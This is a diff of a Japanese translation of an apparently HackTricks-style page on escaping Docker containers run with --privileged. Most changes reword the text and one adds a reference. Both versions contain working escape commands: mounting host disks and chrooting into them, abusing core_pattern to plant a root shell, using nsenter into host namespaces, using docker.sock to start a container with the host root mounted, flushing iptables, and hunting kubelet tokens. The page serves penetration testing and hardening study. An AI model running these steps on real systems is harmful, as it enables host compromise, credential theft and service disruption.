@@ -4,35 +4,35 @@
 
 ## 概要
 
-`--privileged` で起動したコンテナは、権限が1つか2つ追加されただけの通常のコンテナとは異なります。実際には、`--privileged` によって、ワークロードを危険なホストリソースから通常隔離しているデフォルトのランタイム保護が複数削除または弱体化されます。正確な効果はランタイムとホストに依存しますが、Docker では通常、次のようになります。
+`--privileged` で起動されたコンテナは、追加の権限を1つか2つ持つ通常のコンテナとは異なります。実際には、`--privileged` は、通常であればワークロードを危険なホストリソースから隔離しているデフォルトの runtime 保護機能を複数削除または弱体化します。正確な効果は runtime とホストに依存しますが、Docker では通常、次のようになります。
 
 - すべての capabilities が付与される
 - device cgroup の制限が解除される
-- 多くの kernel filesystem が read-only でマウントされなくなる
-- デフォルトで masked になっている procfs のパスが表示される
-- seccomp filtering が無効になる
-- AppArmor confinement が無効になる
-- SELinux isolation が無効になるか、はるかに広範な label に置き換えられる
+- 多くの kernel filesystem が read-only ではなくなる
+- デフォルトで mask された procfs のパスがなくなる
+- seccomp filtering が無効化される
+- AppArmor の confinement が無効化される
+- SELinux の isolation が無効化されるか、より広範な label に置き換えられる
 
-重要な点は、privileged コンテナでは通常、巧妙な kernel exploit が**必要ない**ということです。多くの場合、ホストデバイス、ホストに接続された kernel filesystem、または runtime interface に直接アクセスし、その後 host shell へ pivot できます。
+重要な点は、privileged コンテナでは通常、巧妙な kernel exploit が**必要ない**ということです。多くの場合、host devices、ホストに接続された kernel filesystems、または runtime interfaces と直接やり取りし、その後 host shell へ pivot できます。
 
 ## `--privileged` が自動的には変更しないもの
 
-`--privileged` は、ホストの PID、network、IPC、または UTS namespace に自動的に参加するわけではありません。privileged コンテナにも、private namespace が存在する場合があります。つまり、一部の escape chain には次のような追加条件が必要です。
+`--privileged` は、host PID、network、IPC、または UTS namespaces に自動的に参加することは**ありません**。privileged コンテナでも private namespaces を使用できます。つまり、一部の escape chain では、次のような追加条件が必要になります。
 
 - host bind mount
 - host PID sharing
 - host networking
-- 表示される host device
-- writable な proc/sys interface
+- 可視状態の host devices
+- writable な proc/sys interfaces
 
-このような条件は、実際の misconfiguration では簡単に満たされることが多いものの、概念的には `--privileged` 自体とは別のものです。
+これらの条件は、実際の misconfiguration では簡単に満たされることが多いものの、概念的には `--privileged` 自体とは別のものです。
 
 ## Escape Paths
 
-### 1. Exposed Devices 経由で Host Disk をマウントする
+### 1. Exposed Devices 経由で Host Disk を Mount する
 
-privileged コンテナでは、通常 `/dev` 配下にさらに多くの device node が表示されます。ホストの block device が表示される場合、最も簡単な escape は、それをマウントして `chroot` で host filesystem に入ることです。
+privileged コンテナでは通常、`/dev` 配下により多くの device nodes が表示されます。host block device が表示されている場合、最も簡単な escape は、それを mount して host filesystem に `chroot` することです。
 ```bash
 ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
 mkdir -p /mnt/hostdisk
@@ -40,17 +40,17 @@ mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/de
 ls -la /mnt/hostdisk
 chroot /mnt/hostdisk /bin/bash 2>/dev/null
 ```
-root パーティションが明確でない場合は、まずブロックレイアウトを列挙します:
+rootパーティションが明らかでない場合は、まずブロックレイアウトを列挙します：
 ```bash
 fdisk -l 2>/dev/null
 blkid 2>/dev/null
 debugfs /dev/sda1 2>/dev/null
 ```
-実用的な方法として、`chroot` するのではなく書き込み可能なホストマウントに `setuid` ヘルパーを配置する場合は、すべてのファイルシステムが setuid ビットに対応しているわけではないことを覚えておいてください。ホスト側で簡単に機能を確認する方法は次のとおりです。
+実用的な方法として、`chroot` するのではなく書き込み可能なホストマウントに setuid ヘルパーを配置する場合は、すべてのファイルシステムが setuid ビットを尊重するわけではないことに注意してください。ホスト側での簡単な機能確認方法は次のとおりです。
 ```bash
 mount | grep -v "nosuid"
 ```
-これは、`nosuid` ファイルシステム下の書き込み可能なパスが、従来の「setuid シェルを配置して後で実行する」ワークフローではあまり重要でなくなるため有用です。
+これは、`nosuid` ファイルシステム下の書き込み可能なパスが、従来の「setuid shell を配置し、後で実行する」ワークフローではあまり興味深い対象ではなくなるため有用です。
 
 ここで悪用されている、弱体化した保護機能は次のとおりです。
 
@@ -67,23 +67,23 @@ protections/capabilities.md
 protections/namespaces/mount-namespace.md
 {{#endref}}
 
-### 2. Host の Bind Mount をマウントまたは再利用して `chroot`
+### 2. Host の bind mount をマウントまたは再利用して `chroot` する
 
-Host の root ファイルシステムがすでにコンテナ内にマウントされている場合、またはコンテナが privileged であるため必要な mount を作成できる場合、Host shell の取得は多くの場合 `chroot` を1回実行するだけです。
+Host の root filesystem がすでに container 内にマウントされている場合、または container が privileged であるため必要な mount を作成できる場合、Host shell の取得までに必要なのは、多くの場合 `chroot` だけです:
 ```bash
 mount | grep -E ' /host| /mnt| /rootfs'
 ls -la /host 2>/dev/null
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
-ホスト root bind mount が存在しないものの、ホストストレージに到達可能な場合は、作成します:
+ホストの root bind mount が存在しないが、ホストストレージにアクセス可能な場合は、作成する:
 ```bash
 mkdir -p /tmp/host
 mount --bind / /tmp/host
 chroot /tmp/host /bin/bash 2>/dev/null
 ```
-This path は以下を悪用します:
+この手法は以下を悪用します:
 
-- 弱体化した mount restrictions
+- 弱い mount 制限
 - 完全な capabilities
 - MAC confinement の欠如
 
@@ -105,11 +105,11 @@ protections/apparmor.md
 protections/selinux.md
 {{#endref}}
 
-### 3. Writable `/proc/sys` または `/sys` の悪用
+### 3. 書き込み可能な `/proc/sys` または `/sys` の悪用
 
-`--privileged` の大きな影響の1つは、procfs と sysfs の保護が大幅に弱くなることです。その結果、通常は mask されているか read-only で mount されている、host に接続する kernel interface が露出する可能性があります。
+`--privileged` の大きな影響の 1 つは、procfs と sysfs の保護が大幅に弱くなることです。これにより、通常は mask されているか read-only で mount されている、host 側に影響する kernel interface が露出する可能性があります。
 
-典型的な例が `core_pattern` です:
+典型的な例は `core_pattern` です:<sup>[[1]](#references)</sup>
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] || exit 1
 overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -131,19 +131,19 @@ gcc /tmp/crash.c -o /tmp/crash
 /tmp/crash
 ls -l /tmp/rootsh
 ```
-その他のhigh-valueなパスには、次のものがあります：
+その他の高価値なパスには、次のものがあります:
 ```bash
 cat /proc/sys/kernel/modprobe 2>/dev/null
 cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
 find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
 find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
-この手法は以下を悪用します。
+この経路は以下を悪用します:
 
-- masked paths の欠如
-- read-only system paths の欠如
+- masked paths の欠落
+- read-only system paths の欠落
 
-関連ページ：
+関連ページ:
 
 {{#ref}}
 protections/masked-paths.md
@@ -153,27 +153,27 @@ protections/masked-paths.md
 protections/read-only-paths.md
 {{#endref}}
 
-### 4. Mount または Namespace ベースの Escape に Full Capabilities を使用する
+### 4. Mount または Namespace-Based Escape に Full Capabilities を使用する
 
-privileged container には、通常の container から削除されている capabilities が付与されます。これには `CAP_SYS_ADMIN`、`CAP_SYS_PTRACE`、`CAP_SYS_MODULE`、`CAP_NET_ADMIN` などが含まれます。別の露出した surface が存在すれば、これだけでローカル foothold を host escape に変えるのに十分なことがよくあります。
+privileged container には、通常のコンテナから削除されている `CAP_SYS_ADMIN`、`CAP_SYS_PTRACE`、`CAP_SYS_MODULE`、`CAP_NET_ADMIN` などの capabilities が付与されます。別の露出した攻撃面が存在すれば、これだけでローカル foothold を host escape に変えられることがよくあります。
 
-簡単な例として、追加の filesystem を mount し、namespace entry を使用します。
+簡単な例として、追加のファイルシステムをマウントし、namespace entry を使用します:
 ```bash
 capsh --print | grep cap_sys_admin
 which nsenter
 nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
 ```
-ホストの PID も共有されている場合、手順はさらに短くなります。
+ホストの PID も共有されている場合、手順はさらに短くなります:
 ```bash
 ps -ef | head -n 50
 nsenter -t 1 -m -u -n -i -p /bin/bash
 ```
-この手法は、以下を悪用します。
+この経路では、以下を悪用します。
 
 - デフォルトの privileged capability set
-- オプションのホスト PID 共有
+- オプションの host PID sharing
 
-関連ページ：
+関連ページ:
 
 {{#ref}}
 protections/capabilities.md
@@ -185,7 +185,7 @@ protections/namespaces/pid-namespace.md
 
 ### 5. Runtime Sockets 経由での Escape
 
-privileged container では、ホストの runtime state や socket が見える状態になることがよくあります。Docker、containerd、または CRI-O の socket に到達できる場合、最も簡単な方法は、runtime API を使用してホストアクセス権を持つ 2 つ目の container を起動することです。
+privileged container では、host の runtime state や socket が見える状態になることがよくあります。Docker、containerd、または CRI-O の socket に到達できる場合、多くの場合、最も簡単な方法は runtime API を使用して host access のある2つ目の container を起動することです:
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
@@ -194,10 +194,10 @@ containerd の場合:
 ```bash
 ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
 ```
-この手法では、以下を悪用します。
+この経路では、以下を悪用します。
 
 - privileged runtime exposure
-- runtime 自体を介して作成された host bind mounts
+- runtime 自体を通じて作成された host bind mounts
 
 関連ページ：
 
@@ -209,9 +209,9 @@ protections/namespaces/mount-namespace.md
 runtime-api-and-daemon-exposure.md
 {{#endref}}
 
-### 6. Network Isolation の副作用を排除する
+### 6. Network Isolation の副作用を除去する
 
-`--privileged` だけでは host network namespace に参加しませんが、コンテナに `--network=host` やその他の host-network access もある場合、ネットワークスタック全体が変更可能になります：
+`--privileged` だけでは host network namespace に参加しませんが、コンテナに `--network=host` またはその他の host-network access もある場合、ネットワークスタック全体を変更できるようになります。
 ```bash
 capsh --print | grep cap_net_admin
 ip addr
@@ -220,7 +220,7 @@ iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ip link set lo down 2>/dev/null
 iptables -F 2>/dev/null
 ```
-これは常に直接的な host shell につながるとは限りませんが、denial of service、traffic interception、または loopback 限定の管理サービスへのアクセスを可能にする場合があります。
+これは常に直接的なホスト shell になるとは限りませんが、denial of service、traffic interception、または loopback 限定の管理サービスへのアクセスにつながる可能性があります。
 
 関連ページ:
 
@@ -232,15 +232,15 @@ protections/capabilities.md
 protections/namespaces/network-namespace.md
 {{#endref}}
 
-### 7. Host Secrets と Runtime State の読み取り
+### 7. ホストのシークレットと Runtime State の読み取り
 
-clean な shell escape がすぐに実行できない場合でも、privileged containers は多くの場合、host secrets、kubelet state、runtime metadata、および隣接する container の filesystems を読み取るのに十分なアクセス権を持っています:
+クリーンな shell escape がすぐに発生しない場合でも、privileged containers は多くの場合、ホストのシークレット、kubelet の state、runtime メタデータ、隣接するコンテナのファイルシステムを読み取るのに十分なアクセス権を持っています:
 ```bash
 find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
 find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
 find /var/lib/containerd -type f 2>/dev/null | head -n 50
 ```
-`/var` がホストにマウントされている、またはランタイムディレクトリが可視になっている場合、ホスト shell を取得する前であっても、これだけで lateral movement や cloud/Kubernetes credential theft が可能になることがあります。
+`/var` が host-mounted されているか、runtime directories が見える場合、host shell を取得する前であっても、lateral movement や cloud/Kubernetes credential theft に十分悪用できます。
 
 関連ページ:
 
@@ -252,9 +252,9 @@ protections/namespaces/mount-namespace.md
 sensitive-host-mounts.md
 {{#endref}}
 
-## Checks
+## チェック
 
-以下のコマンドの目的は、どの privileged-container escape の種類が直ちに実行可能かを確認することです。
+以下のコマンドの目的は、どの privileged-container escape family が直ちに実行可能かを確認することです。
 ```bash
 capsh --print                                    # Confirm the expanded capability set
 mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
@@ -267,11 +267,11 @@ find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
 
 - 完全な capability セット、特に `CAP_SYS_ADMIN`
 - 書き込み可能な proc/sys の公開
-- ホストデバイスが見えている
-- seccomp と MAC confinement がない
+- ホストデバイスが可視
+- seccomp と MAC confinement が存在しない
 - runtime sockets またはホストの root bind mounts
 
-これらのいずれか1つだけでも post-exploitation には十分な場合があります。複数が同時に存在する場合、通常はコンテナからホストを compromise するまで、実質的に1〜2コマンドしか必要ありません。
+これらのいずれか1つだけでも post-exploitation には十分な場合があります。複数が同時に存在する場合、通常はコンテナが、あと1〜2個のコマンドでホストを compromise できる状態にあることを意味します。
 
 ## 関連ページ
 
@@ -310,4 +310,9 @@ protections/namespaces/pid-namespace.md
 {{#ref}}
 protections/namespaces/network-namespace.md
 {{#endref}}
+
+## 参考資料
+
+- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)
+
 {{#include ../../../banners/hacktricks-training.md}}
